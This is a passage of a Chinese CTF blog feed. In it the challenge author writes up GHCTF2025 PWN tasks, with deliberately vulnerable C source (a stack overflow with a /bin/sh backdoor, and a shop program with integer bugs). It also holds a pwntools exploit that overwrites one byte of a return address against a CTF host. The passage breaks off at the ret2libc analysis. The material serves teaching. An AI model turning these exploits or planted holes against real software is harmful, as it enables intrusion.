    <content type="html"><![CDATA[<h1 id="远程链接"><a href="#远程链接" class="headerlink" title="远程链接"></a>远程链接</h1><h2 id="pwn堆系列"><a href="#PWN堆系列" class="headerlink" title="PWN堆系列"></a>PWN堆系列</h2><h3 id="fastbin_attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h3><h1 id="本地链接"><a href="#本地链接" class="headerlink" title="本地链接"></a>本地链接</h1><h2 id="pwn堆系列"><a href="#PWN堆系列-1" class="headerlink" title="PWN堆系列"></a>PWN堆系列</h2>]]></content>
    
    
    <summary type="html">前言：本篇文章作为这个博客PWN系列文章索引</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>GHCTF2025-PWN方向wp</title>
    <link href="http://iyheart.github.io/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/"/>
    <id>http://iyheart.github.io/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/</id>
    <published>2025-03-09T10:54:59.000Z</published>
    <updated>2025-03-11T12:34:19.930Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><ul><li>这次是我第一次出题，没什么经验，大部分题目都是对着一些比较经典的题目改的，QAQ。（还偷偷赛了题国际赛题）</li><li>这次出题感受还是挺深的，还是要多尝试一点东西。接下来就直接开始<code>wp</code>环节</li></ul><h1 id="hello_world"><a href="#Hello-World" class="headerlink" title="Hello_World"></a>Hello_World</h1><ul><li>考点：<code>ret2text</code>、<code>PIE保护</code>、<code>Linux内存分页机制</code>、<code>off-by-one</code></li><li>这题并不用爆破最后一个字节，题目已经设定好了。接下来我们来具体分析一下这个附件</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">32</span>];</span><br><span class="line">        read(<span class="number">0</span>,s,<span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">out</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*****   *   *  *****  ******   ***** \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*       *   *  *        *      *     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;* ****  *****  *        *      ***** \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*   *   *   *  *        *      *     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*****   *   *  *****    *      *     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello pwner!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the world of pwn!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Show time!!!!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        init();</span><br><span class="line">        out();</span><br><span class="line">        func1();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc编译需要开启PIE保护，要关闭canary保护</span></span><br></pre></td></tr></table></figure><h2 id="helloworld分析1"><a href="#HelloWorld分析1" class="headerlink" title="HelloWorld分析1"></a>Hello<em>World</em>分析1</h2><ul><li>拿到附件后肯定是先要<code>check</code>一下这个附件开启了什么保护机制。<code>check</code>完后我们发现这个程序没有开启<code>canary</code>保护，但是开启了<code>PIE</code>保护</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190655495.png" alt="image-20250309190655495"></p><ul><li>接下来我们使用<code>IDA pro</code>反汇编一下这个代码，我们发现<code>main</code>函数这边只执行了<code>3</code>个函数，第一个<code>init</code>就不分析了，对输入输出进行初始化</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190804003.png" alt="image-20250309190804003"></p><ul><li>然后我们再来分析一下<code>out()</code>这个函数，发现并没有什么特别的，仅仅是几个输出函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190908838.png" alt="image-20250309190908838"></p><ul><li>现在来查看<code>func1</code>这个函数，发现这边会存在一个栈溢出的漏洞</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190954154.png" alt="image-20250309190954154"></p><ul><li>我们还注意到，这边还有一个函数名为<code>backdoor</code>的函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191039841.png" alt="image-20250309191039841"></p><ul><li>查看该函数会发现确实是一个后门函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191144341.png" alt="image-20250309191144341"></p><ul><li>由于程序开启了<code>PIE</code>保护，我们无法完全确定程序的地址，所以我们<code>IDA pro</code>反编译完，<code>backdoor</code>的这个函数地址是这样的</li><li>如果我们将<code>PIE</code>关闭后，在<code>64</code>位下程序会地址会为<code>0x400000</code>，在<code>32</code>为下程序地址为<code>0x08048000</code>（可以随便找两个对应靶场题目附件反编译看看）</li><li>但是由于内存分页机制，程序地址最后<code>3</code>个<code>16</code>进制位是不会改变的<code>Linux</code>下一个内存页为<code>0x1000</code>即（4KB）</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191314152.png" alt="image-20250309191314152"></p><ul><li>而我们调用<code>func1</code>这个函数时，保存的返回地址其实是<code>main</code>函数汇编中对应的这个汇编指令</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191836758.png" alt="image-20250309191836758"></p><ul><li>这时我们发现第<code>3</code>个二进制位他们是相同的。</li></ul><h2 id="helloworld分析2"><a href="#HelloWorld分析2" class="headerlink" title="HelloWorld分析2"></a>Hello<em>World</em>分析2</h2><ul><li>这时我们来进行动态调试，我们查看一下返回地址，我们发现调用<code>func1</code>时，保存在栈上的返回地址为<code>0x555eb72009f6</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309192103483.png" alt="image-20250309192103483"></p><ul><li>我们再来查看<code>backdoor</code>这个函数的起始地址，这个函数的起始地址为<code>0x555eb72009c1</code>（我们多次动态调试会发现其实<code>返回地址</code>和<code>backdoor</code>函数的起始地址其实就只有最后一个字节是<code>不同的</code>）</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309192219972.png" alt="image-20250309192219972"></p><ul><li>这里要<strong>注意一下</strong>：如果<code>backdoor</code>和返回地址的第三个<code>16进制位</code>不同这时就要需要爆破，因为我们使用<code>read</code>的时候是一个字节一个字节写入到栈上，而一个字节是<code>2</code>个16进制位。我们再修改第<code>3</code>个16进制位的时候会修改到第<code>4</code>个16进制位。这时由于我们不知道第<code>4</code>个16进制位具体是多少，返回的时候就不知道返回到哪个地方了，所以如果遇到这种情况的话就需要进行爆破了。</li></ul><h2 id="hello_world_exp"><a href="#Hello-World-exp" class="headerlink" title="Hello_World_exp"></a>Hello_World_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28285</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../attachment&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p8(<span class="number">0xC5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><ul><li>考点：<code>ret2libc</code>、<code>栈溢出</code>、<code>代码审计</code>。</li><li><p>这题其实就是<code>ret2libc</code>，这题并不是那种简单的一眼栈溢出的，可能还要稍微逆一下。遇到这种题不要害怕，认真逆。（走出做太多简单直白的<code>ret2libc</code>题目这个舒适区，同时也为堆的代码逆向做铺垫。）</p></li><li><p>这题源码如下：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> money = <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> what_can_I_say = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">flower</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hell_money</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">clothing</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shop</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">see_it</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">books</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">check_money</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read_count</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);   </span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to shop, what do you buy?\n&quot;</span>);       </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.flowers\n&quot;</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2.books\n&quot;</span>);    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3.hell money\n&quot;</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4.clothing\n&quot;</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5.buy my shop\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;6.check youer money\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flower</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">        <span class="type">int</span> choose;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Which kind of flower would you like buy?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1.peony $10\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2.rose $100\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3.fragrans $20\n&quot;</span>);</span><br><span class="line">        choose = read_count();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How many flowers do you want to buy?\n&quot;</span>);</span><br><span class="line">        count = read_count();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(choose)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">10</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">10</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">100</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">100</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">20</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">20</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Invalid choose\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">books</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">        <span class="type">int</span> choose;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Which kind of books would you like buy?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1.story books $10\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2.novel books $80\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3.note books $20\n&quot;</span>);</span><br><span class="line">        choose = read_count();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How many books do you want to buy?\n&quot;</span>);</span><br><span class="line">        count = read_count();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(choose)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">10</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">10</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">80</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">80</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">20</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">20</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Invalid choose\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hell_money</span><span class="params">()</span>&#123;    </span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1$ = 1000hell_money\n&quot;</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much do you want to spend buying the hell_money?\n&quot;</span>);</span><br><span class="line">    count = read_count();</span><br><span class="line">    <span class="keyword">if</span>(money &lt; count) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        what_can_I_say += count*<span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clothing</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the price of clothing is 50$\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much do you want to buy\n&quot;</span>);</span><br><span class="line">    count = read_count();</span><br><span class="line">    <span class="keyword">if</span>(money &lt; count * <span class="number">50</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            money -= <span class="number">50</span>*count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shop</span><span class="params">()</span>&#123;</span><br><span class="line">        </span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x40</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Do you want to buy my shop?\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(money &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                </span><br><span class="line">        money -= <span class="number">100000</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;give you my shop!!!\n&quot;</span>); </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You can name it!!!\n&quot;</span>);    </span><br><span class="line">        read(<span class="number">0</span>,name,<span class="number">0x80</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;roll!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">see_it</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Barter?!1000$ = 1hell_money\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much do you exchange?&quot;</span>);</span><br><span class="line">    count = read_count();</span><br><span class="line">    what_can_I_say -=count;</span><br><span class="line">    money += count * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_count</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">8</span>];</span><br><span class="line">    read(<span class="number">0</span>,ch,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">return</span> atoi(ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_money</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you have %d $\n&quot;</span>,money);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you have %d hell_money\n&quot;</span>,what_can_I_say);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> ch[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                menu();</span><br><span class="line">                <span class="keyword">switch</span>(read_count())</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                flower();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                books();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                hell_money();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                                clothing();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                                shop();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                                check_money();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                                see_it();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;Invalid choose\n&quot;</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2libc1_分析1"><a href="#ret2libc1-分析1" class="headerlink" 